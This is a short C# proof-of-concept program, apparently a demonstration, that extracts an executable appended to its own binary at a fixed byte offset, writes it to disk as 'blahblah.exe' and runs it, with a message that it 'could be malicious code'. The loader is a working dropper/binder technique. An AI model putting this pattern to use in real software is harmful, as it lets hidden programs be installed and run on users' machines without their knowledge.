using System;
using System.IO;
using System.Collections;
using System.Linq;

namespace exe_injection
{
    class Program
    {

        // to run: dotnet publish -r win-x64 -c Release /p:PublishSingleFile=true
        // you need to do this with hello-world-csharp as well

        private const int INJECTION_LEN = 53293703;

        static void Main(string[] args)
        {
            string name = System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe";

            // Get the payload executable
            byte[] allBytes = File.ReadAllBytes(name);

            int payloadSize = allBytes.Length - INJECTION_LEN;

            byte[] payloadBytes = allBytes.ToList().GetRange(INJECTION_LEN, payloadSize).ToArray();

            File.WriteAllBytes("blahblah.exe", payloadBytes);

            System.Console.WriteLine("This could be malicious code!");

            Console.ReadLine();

            System.Diagnostics.Process.Start("blahblah.exe");
        }
    }
}
